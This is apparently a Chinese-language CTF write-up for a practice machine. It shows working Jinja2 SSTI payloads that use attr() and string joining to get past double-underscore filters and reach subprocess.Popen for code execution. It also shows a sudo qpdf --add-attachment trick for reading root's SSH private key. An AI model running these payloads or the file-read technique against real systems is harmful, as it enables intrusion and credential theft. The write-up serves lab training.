发现 SSTI 注入点

管理面板有 Generate Invoice 和 Generate QR 两个功能。先生成 Invoice ID，再在 QR 码链接参数 qr_link 中测试 SSTI：

invoice_id=&form_type=scannable_invoice&qr_link={{7*7}}

响应中 QR 码图片的 src 属性包含 49（7×7），确认 Jinja2 SSTI。

🧒 儿童版：网站有一个"生成带二维码的发票"功能。二维码链接会被直接嵌入到网页模板中。我们在链接位置写入 {{7*7}}，网页显示了 49——说明服务器把我们的输入当成了模板代码执行。这就是 SSTI，和 SQL 注入类似，只不过注入的是模板代码。

双下划线混淆绕过 + RCE

直接使用 __class__ 等双下划线属性会被过滤。使用 attr() 和字符串拼接绕过：

# 列出所有子类
{{''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)()}}

在子类列表中找到 subprocess.Popen（索引 365）。构造命令执行 payload：

{{(''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)())[365]('id',shell=True,stdout=-1).communicate()}}

返回 uid=33(www-data)。

权限提升 sudo qpdf 读取 Root SSH 私钥

检查 sudo 权限

consuela@iclean:~$ sudo -l
User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf

qpdf 是一个 PDF 操作命令行工具。--add-attachment 参数可以将任意文件作为附件嵌入到 PDF 中。由于 qpdf 以 root 权限运行，可以读取 root 用户的文件。

利用 qpdf 提取 root SSH 私钥

# 创建空白 PDF（攻击机生成后 scp 传过去）
convert -size 595x842 xc:white -gravity center -annotate 0 'dummy' dummy.pdf
scp dummy.pdf consuela@capiclean.htb:/tmp

# 将 root 的 SSH 私钥作为附件嵌入 PDF
sudo /usr/bin/qpdf /tmp/dummy.pdf --add-attachment /root/.ssh/id_rsa -- /tmp/root_key.pdf

# 提取附件内容（不需要 sudo）
qpdf /tmp/root_key.pdf --show-attachment=id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----

...
-----END OPENSSH PRIVATE KEY-----
🧒 儿童版：qpdf 是一个 PDF 工具，可以往 PDF 里塞附件。管理员给了 consuela sudo qpdf 的权限，本意是让她处理发票 PDF。但 --add-attachment 不检查附件来源——我们让 root 权限的 qpdf 把 root 的 SSH 钥匙塞进 PDF，然后用普通权限把钥匙从 PDF 里掏出来。

额外知识

SSTI 双下划线绕过技巧

Jinja2 SSTI 中常用的 __class__、__base__、__subclasses__() 如果被 WAF 或过滤函数拦截，可以用以下方式绕过：

原始写法绕过写法
''.__class__''|attr(["_"*2,"class","_"*2]|join)
.__base__|attr(["_"*2,"base","_"*2]|join)
.__subclasses__()|attr(["_"*2,"subclasses","_"*2]|join)()

核心原理：attr() 过滤器接受字符串参数访问对象属性，而 ["_"*2,"class","_"*2]|join 在运行时拼接出 __class__，绕过了静态字符串匹配的过滤。

qpdf 作为文件读取工具

qpdf 的 --add-attachment 功能本质上是将指定路径的文件读取并嵌入到 PDF 中。当以 sudo 运行时，它可以读取 root 权限的任何文件。--show-attachment 则可以不需要 sudo 将嵌入的文件内容输出到标准输出。这种"借 PDF 中转"的手法也适用于其他支持附件功能的文档处理工具。
